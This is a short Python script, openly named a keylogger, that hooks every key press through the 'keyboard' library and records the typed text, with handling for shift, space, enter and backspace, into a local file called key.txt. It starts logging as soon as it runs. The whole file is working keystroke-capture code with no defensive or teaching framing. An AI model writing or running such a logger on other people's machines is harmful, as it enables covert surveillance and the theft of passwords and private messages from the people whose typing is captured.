import keyboard

class KeyLogger:
    def __init__(self, logFileName):
        self.f = open(logFileName, "w")

    def startLog(self):
        keyboard.on_press(self.newKey)
        keyboard.wait()

    def newKey(self, event):
        button = event.name

        if button in ["shift", "left shift", "right shift", "ctrl", "alt", "tab"]:
            return

        if button == "space":
            button = " "

        elif button == "enter":
            self.f.write("\n")
            self.f.flush()
            return

        elif button == "backspace":
            self.f.seek(0, 2)
            pos = self.f.tell()
            if pos > 0:
                self.f.seek(pos - 1)
                self.f.truncate()
            return  

        if keyboard.is_pressed("shift") and len(button) == 1:
            button = button.upper()

        self.f.write(button)
        self.f.flush()


keyl = KeyLogger("key.txt")
keyl.startLog()
